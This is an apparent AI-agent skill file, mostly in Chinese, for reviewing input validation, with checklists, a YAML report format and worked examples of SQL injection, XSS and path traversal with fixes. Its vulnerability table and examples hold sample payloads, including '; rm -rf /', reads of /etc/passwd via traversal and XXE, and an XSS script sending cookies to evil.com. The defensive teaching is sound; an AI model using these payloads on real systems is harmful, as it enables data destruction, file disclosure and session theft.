# Skill: input-validation-review

## Purpose

检查输入验证逻辑，识别注入攻击、XSS、路径遍历等安全漏洞。

解决的核心问题：
- 输入验证缺失
- 注入攻击漏洞
- XSS 漏洞
- 路径遍历漏洞
- 不安全的反序列化

## When to Use

必须使用时：
- 涉及用户输入的功能
- 涉及文件路径的功能
- 涉及数据库查询的功能
- 涉及命令执行的功能
- 标记为高风险的 task

推荐使用时：
- 任何接收外部输入的功能
- API 接口开发
- 表单处理功能
- 文件上传功能

## When Not to Use

不适用场景：
- 纯内部无外部输入
- 输入已在前端验证（仍需服务端验证）
- 无用户交互的系统

## Validation Principles

### 1. 白名单原则
- 只接受已知的合法输入
- 拒绝所有其他输入
- 优于黑名单（拒绝已知的坏输入）

### 2. 服务端验证
- 永远不要信任客户端
- 所有输入在服务端重新验证
- 客户端验证仅用于用户体验

### 3. 分层验证
- 边界验证（格式、类型、长度）
- 业务验证（逻辑、范围、约束）
- 安全验证（注入、XSS）

### 4. 失败安全
- 验证失败时拒绝访问
- 不返回敏感信息
- 记录安全事件

## Review Checklist

### 1. 基础验证 (Basic Validation)

#### 1.1 类型验证
- [ ] 是否验证数据类型？
- [ ] 字符串长度是否限制？
- [ ] 数值范围是否限制？
- [ ] 日期格式是否验证？
- [ ] 枚举值是否在合法集合？

#### 1.2 格式验证
- [ ] 邮箱格式是否正确验证？
- [ ] URL 格式是否正确验证？
- [ ] 手机号格式是否正确验证？
- [ ] 正则表达式是否合理？

#### 1.3 空值处理
- [ ] 是否处理 null/undefined？
- [ ] 是否处理空字符串？
- [ ] 空值是拒绝还是接受？
- [ ] 默认值是否合理？

### 2. 注入攻击防护 (Injection Prevention)

#### 2.1 SQL 注入
- [ ] 是否使用参数化查询？
- [ ] 是否避免字符串拼接 SQL？
- [ ] ORM 是否正确使用？
- [ ] 动态查询是否安全？

#### 2.2 命令注入
- [ ] 是否避免执行用户输入的命令？
- [ ] 如果必须执行，是否严格验证？
- [ ] 是否使用白名单？

#### 2.3 NoSQL 注入
- [ ] MongoDB 查询是否安全？
- [ ] 是否避免 $where 操作？
- [ ] 用户输入是否作为键名？

#### 2.4 LDAP/XML 注入
- [ ] LDAP 查询是否参数化？
- [ ] XML 解析是否禁用外部实体？
- [ ] XPath 查询是否安全？

### 3. XSS 防护

- [ ] 输出是否编码？
- [ ] HTML 内容是否正确转义？
- [ ] JavaScript 上下文是否正确处理？
- [ ] URL 参数是否正确编码？
- [ ] CSS 上下文是否正确处理？

### 4. 路径遍历防护

- [ ] 文件路径是否规范化？
- [ ] 是否限制在允许目录？
- [ ] 是否使用白名单文件名？
- [ ] 是否检查路径穿越（../）？

### 5. 文件上传安全

- [ ] 是否验证文件类型？
- [ ] 是否检查文件内容（而非仅扩展名）？
- [ ] 是否限制文件大小？
- [ ] 是否存储在非 Web 目录？
- [ ] 是否重命名文件？
- [ ] 是否扫描恶意内容？

### 6. 反序列化安全

- [ ] 是否避免反序列化不可信数据？
- [ ] 如果必须，是否使用安全模式？
- [ ] 是否签名验证？

## Common Vulnerabilities

| 漏洞 | 描述 | 示例 | 修复 |
|------|------|------|------|
| **SQL 注入** | 恶意 SQL 语句 | `' OR '1'='1` | 参数化查询 |
| **XSS** | 注入恶意脚本 | `<script>alert(1)</script>` | 输出编码 |
| **命令注入** | 执行任意命令 | `; rm -rf /` | 避免命令执行 |
| **路径遍历** | 访问未授权文件 | `../../../etc/passwd` | 路径规范化 |
| **LDAP 注入** | 修改 LDAP 查询 | `*)(uid=*))(&(uid=*` | 参数化查询 |
| **XXE** | XML 外部实体 | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | 禁用外部实体 |

## Steps

### Step 1: 识别输入点
1. 读取 changed_files
2. 识别所有输入来源
3. 识别数据流
4. 标记危险操作

### Step 2: 检查基础验证
1. 检查类型验证
2. 检查长度验证
3. 检查格式验证
4. 检查空值处理

### Step 3: 检查注入防护
1. 检查 SQL 查询
2. 检查命令执行
3. 检查 NoSQL 查询
4. 检查 LDAP/XML 操作

### Step 4: 检查 XSS 防护
1. 检查输出编码
2. 检查不同上下文
3. 检查 DOM 操作
4. 检查模板渲染

### Step 5: 检查文件操作
1. 检查路径验证
2. 检查文件上传
3. 检查反序列化

### Step 6: 生成安全报告

## Output Format

```yaml
input_validation_review:
  dispatch_id: string
  task_id: string
  
  scope:
    inputs_reviewed:
      - source: string
        type: http_body | query_param | path_param | header | file
        description: string
        
  validation_findings:
    - id: string
      severity: critical | high | medium | low | info
      category: sql_injection | xss | command_injection | path_traversal | 
                nosql_injection | ldap_injection | deserialization | 
                missing_validation | insufficient_validation
      
      input:
        source: string
        parameter: string
        description: string
        
      vulnerability:
        type: string
        cwe: string
        owasp: string
        description: string
        
      vulnerable_code:
        location: string
        snippet: string
        
      exploit_scenario:
        payload: string
        impact: string
        
      remediation:
        recommendation: string
        secure_code_example: string
        validation_rules:
          - rule: string
            pattern: string
        effort: quick | moderate | extensive
        
  validation_coverage:
    total_inputs: number
    validated_inputs: number
    validation_rate: number
    missing_validation: string[]
    
  risk_assessment:
    overall_risk: critical | high | medium | low
    
  gate_decision:
    decision: pass | needs-fix | block
    conditions: string[]
    
  recommendations:
    must_fix: string[]
    should_fix: string[]
    consider: string[]
```

## Examples

### 示例 1：SQL 注入漏洞

```yaml
input_validation_review:
  scope:
    inputs_reviewed:
      - source: "GET /api/users"
        type: query_param
        parameter: "username"
        description: "用户名查询参数"
        
  validation_findings:
    - id: VAL-001
      severity: critical
      category: sql_injection
      
      input:
        source: "GET /api/users?username="
        parameter: "username"
        description: "用户名查询参数直接拼接到 SQL"
        
      vulnerability:
        type: "SQL Injection"
        cwe: "CWE-89"
        owasp: "A03:2021 - Injection"
        description: "用户输入直接拼接到 SQL 查询语句"
        
      vulnerable_code:
        location: "UserRepository.ts:25"
        snippet: |
          const query = `SELECT * FROM users WHERE username = '${username}'`
          return await db.query(query)
          
      exploit_scenario:
        payload: "' OR '1'='1' --"
        impact: |
          攻击者可以：
          1. 绕过认证
          2. 提取所有用户数据
          3. 修改或删除数据
          4. 执行任意 SQL 命令
          
      remediation:
        recommendation: "使用参数化查询"
        secure_code_example: |
          const query = 'SELECT * FROM users WHERE username = ?'
          return await db.query(query, [username])
        validation_rules:
          - rule: "使用参数化查询"
          - rule: "验证用户名格式"
            pattern: "^[a-zA-Z0-9_]{3,50}$"
        effort: quick
        
    - id: VAL-002
      severity: medium
      category: missing_validation
      
      input:
        source: "POST /api/users"
        type: http_body
        parameter: "email"
        description: "用户邮箱"
        
      vulnerability:
        description: "邮箱格式未验证"
        
      remediation:
        recommendation: "添加邮箱格式验证"
        secure_code_example: |
          const emailSchema = z.string().email()
          const result = emailSchema.safeParse(email)
          if (!result.success) {
            throw new ValidationError('Invalid email format')
          }
        effort: quick
        
  validation_coverage:
    total_inputs: 5
    validated_inputs: 2
    validation_rate: 40
    missing_validation:
      - "username 长度未限制"
      - "email 格式未验证"
      - "age 范围未验证"
      
  risk_assessment:
    overall_risk: critical
    
  gate_decision:
    decision: block
    conditions:
      - "必须修复 VAL-001（SQL 注入）"
      - "建议为所有输入添加验证"
```

### 示例 2：XSS 漏洞

```yaml
input_validation_review:
  validation_findings:
    - id: VAL-003
      severity: high
      category: xss
      
      input:
        source: "用户评论"
        type: http_body
        parameter: "content"
        
      vulnerability:
        type: "Stored XSS"
        cwe: "CWE-79"
        owasp: "A03:2021 - Injection"
        description: "用户输入直接渲染到页面，未编码"
        
      vulnerable_code:
        location: "CommentComponent.tsx:15"
        snippet: |
          <div className="comment">
            {comment.content}
          </div>
          
      exploit_scenario:
        payload: "<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"
        impact: |
          攻击者可以：
          1. 窃取用户 Cookie
          2. 以用户身份执行操作
          3. 钓鱼攻击
          
      remediation:
        recommendation: "输出时进行 HTML 编码"
        secure_code_example: |
          import { escapeHtml } from 'utils'
          
          <div className="comment">
            {escapeHtml(comment.content)}
          </div>
        effort: quick
```

### 示例 3：路径遍历漏洞

```yaml
input_validation_review:
  validation_findings:
    - id: VAL-004
      severity: high
      category: path_traversal
      
      input:
        source: "GET /api/files"
        type: query_param
        parameter: "filename"
        
      vulnerability:
        type: "Path Traversal"
        cwe: "CWE-22"
        owasp: "A01:2021 - Broken Access Control"
        description: "文件名未验证，可访问任意文件"
        
      vulnerable_code:
        location: "FileController.ts:30"
        snippet: |
          const filePath = `./uploads/${filename}`
          return fs.readFileSync(filePath)
          
      exploit_scenario:
        payload: "../../../etc/passwd"
        impact: |
          攻击者可以读取服务器上任意文件，
          包括配置文件、密钥等敏感信息。
          
      remediation:
        recommendation: "验证文件名，限制目录"
        secure_code_example: |
          const allowedFiles = ['report.pdf', 'data.csv']
          if (!allowedFiles.includes(filename)) {
            throw new ForbiddenError('Invalid filename')
          }
          const filePath = path.resolve('./uploads', filename)
          if (!filePath.startsWith(path.resolve('./uploads'))) {
            throw new ForbiddenError('Path traversal detected')
          }
        effort: moderate
```

## Checklists

### 审查前
- [ ] 输入点已识别
- [ ] 数据流已梳理
- [ ] 危险操作已标记

### 审查中
- [ ] 基础验证已检查
- [ ] 注入漏洞已检查
- [ ] XSS 已检查
- [ ] 文件操作已检查

### 审查后
- [ ] 漏洞已分级
- [ ] 修复建议已给出
- [ ] 验证规则已定义
- [ ] Gate 决策已做

## Notes

### 与 auth-and-permission-review 的关系
- auth-and-permission-review 检查认证授权
- input-validation-review 检查输入安全
- 两者都是 security skill

### 自动化工具
- 静态分析：检测 SQL 注入、XSS 模式
- 动态扫描：模糊测试输入
- 人工审查：业务逻辑漏洞

### 最佳实践
1. 永远不信任用户输入
2. 使用白名单验证
3. 参数化所有查询
4. 输出时编码
5. 最小权限原则

## Anti-Patterns (BR-001, BR-002, BR-003, BR-004)

### AP-001: Vague Security Warning (模糊安全警告)
**Definition**: 泛泛的"验证输入"建议，没有具体输入点或漏洞类型。
**Example**: "Validate all inputs properly."
**Prevention**: 要求指定具体 input source、parameter、vulnerability type。
**BR Violation**: BR-001 (Security Must Be Actionable)

### AP-002: Missing Severity (缺少严重性分类)
**Definition**: 发现没有严重性分类。
**Example**: "There's a validation issue."
**Prevention**: 要求所有 findings 必须有 severity 字段。
**BR Violation**: BR-004 (Severity Classification)

### AP-003: False Positive Without Evidence (无证据的误报)
**Definition**: 声称漏洞但没有展示 vulnerable code。
**Example**: "This might have SQL injection" 不提供查询代码。
**Prevention**: 要求提供 vulnerable_code.snippet 展示漏洞。
**BR Violation**: BR-002 (Evidence-Based Findings)

### AP-004: No Remediation (无修复建议)
**Definition**: 发现没有如何修复的指导或安全代码示例。
**Example**: "This input is not validated."
**Prevention**: 要求 remediation 字段包含 secure_code_example。
**BR Violation**: BR-001 (Security Must Be Actionable)

### AP-005: Security Scope Creep (安全范围蔓延)
**Definition**: 实现非 MVP 安全技能。
**Example**: 在 008 中实现 dependency-risk-review。
**Prevention**: 明确范围边界，MVP 仅包含 auth-and-permission-review 和 input-validation-review。
**BR Violation**: BR-005 (MVP Boundary Discipline)

### AP-006: Gate Decision Omission (缺少 Gate 决策)
**Definition**: 输入验证报告没有 pass/needs-fix/block 决策。
**Example**: 报告结束没有 gate_decision。
**Prevention**: 要求 gate_decision 字段必须存在。
**BR Violation**: BR-003 (Gate Decision Required)

## Role Boundaries

### Security Does NOT (BR-006)
- **修改实现代码**: Security 只提供发现，不修改代码
- **声明功能验收**: 接受决策是 reviewer 角色的职责
- **审查非安全方面**: 代码风格、架构决策是 reviewer 的职责

### Parallel Execution with Reviewer (BR-007)
- Security 与 reviewer 并行执行高风险任务
- Security gate decision 告知 reviewer，但不替代 reviewer 的接受决策
- Security block 通常导致 reviewer reject，直到安全问题解决

### Escalation Rules
当以下情况必须升级：
- **SQL/Command Injection 发现**: 立即阻止，通知 developer
- **Multiple injection vulnerabilities**: 可能系统性问题
- **Third-party library vulnerability**: 需要 management 决策
- **Fix requires architecture change**: 需要 architect 决策

## Input/Output Specifications

### Required Inputs
| Input | Source | Purpose |
|-------|--------|---------|
| `changed_files` | developer | 确定审查范围 |
| `implementation-summary` | developer | 理解实现意图 |
| `task-risk-level` | feature context | 判断审查必要性 |

### Output Artifact
| Artifact | Contract | Purpose |
|----------|----------|---------|
| `input-validation-review-report` | `specs/008-security-core/contracts/input-validation-review-report-contract.md` | 输入验证发现报告 |

## Failure Modes

### Common Failure Modes
| Failure Mode | Detection | Prevention |
|--------------|-----------|------------|
| **Missing input source** | No input trace | Require input.source |
| **Generic validation advice** | No specific fix | Require secure_code_example |
| **No data flow trace** | Missing flow | Trace input to sink |
| **No gate decision** | Missing decision | Mandatory gate_decision |
| **Injection not demonstrated** | No exploit payload | Require exploit_scenario |
